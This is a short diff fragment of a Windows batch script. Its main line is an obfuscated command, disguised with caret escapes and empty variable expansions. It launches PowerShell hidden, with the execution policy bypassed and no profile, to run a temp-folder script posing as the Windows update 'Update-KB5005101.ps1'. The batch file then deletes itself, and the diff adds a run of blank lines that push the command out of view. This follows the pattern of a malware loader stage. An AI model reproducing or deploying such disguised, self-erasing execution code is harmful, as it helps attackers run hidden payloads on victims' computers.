@@ -6,3 +6,15 @@
 @Cd %tmp% && ,pOw%_Socket(i)_%eR^sH%_i_%El^L -ExeC^ut%'b%I^oN ByP%\x0a%a^Ss -Win%_#1%dOw^stY^le hI%i0%d^Den -NoP%_i%r^Ofi%stuff%Le -Fi%Nall%l^E %tmp%\Update-KB50%i0_%05101.ps1
 del "%~f0"
 
+
+
+
+
+
+
+
+
+
+
+
+
